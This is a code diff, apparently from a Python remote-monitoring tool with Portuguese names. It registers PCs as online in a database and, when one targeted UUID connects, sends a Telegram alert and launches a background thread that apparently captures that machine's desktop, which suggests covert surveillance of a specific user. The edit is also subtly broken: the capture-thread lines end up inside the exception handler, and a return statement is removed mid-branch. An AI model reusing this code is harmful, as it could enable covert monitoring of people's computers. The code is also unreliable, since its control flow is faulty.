@@ -705,19 +705,22 @@ def start_auto_getdesktop(nome, uuid):
 # USER ENTRA / SAI
 # =========================
 def user_entra(uuid, nome):
-    conn = ligar_db()
-    cursor = conn.cursor()
-    cursor.execute("""
-        INSERT INTO pcs_online (uuid, nome, status)
-        VALUES (%s, %s, 'online')
-        ON DUPLICATE KEY UPDATE status='online'
-    """, (uuid, nome))
-    conn.commit()
-    cursor.close()
-    conn.close()
+    try:
+        conn = ligar_db()
+        cursor = conn.cursor()
+        cursor.execute("""
+            INSERT INTO pcs_online (uuid, nome, status)
+            VALUES (%s, %s, 'online')
+            ON DUPLICATE KEY UPDATE status='online'
+        """, (uuid, nome))
+        conn.commit()
+        cursor.close()
+        conn.close()
 
-    if uuid.strip().lower() == TARGET_UUID.lower():
-        send_telegram(f"🚨 Comercial ATIVO!!\n🟢 {nome}\nUUID: {uuid}")
+        if uuid and TARGET_UUID and uuid.strip().lower() == TARGET_UUID.lower():
+            send_telegram(f"🚨 Comercial ATIVO!!\n🟢 {nome}\nUUID: {uuid}")
+    except Exception:
+        pass
         import threading
         threading.Thread(target=start_auto_getdesktop, args=(nome, uuid), daemon=True).start()
 
@@ -7306,9 +7309,6 @@ def obter_uuid():
                             return candidate
         except Exception:
             pass
-
-        return None
-
     # =========================
     # Linux (extra, não interfere)
     # =========================
@@ -7374,7 +7374,7 @@ def obter_uuid():
     except Exception:
         pass
 
-    return None
+    return "PC_DESCONHECIDO"
 
 
 # ======================= LOGIN =======================
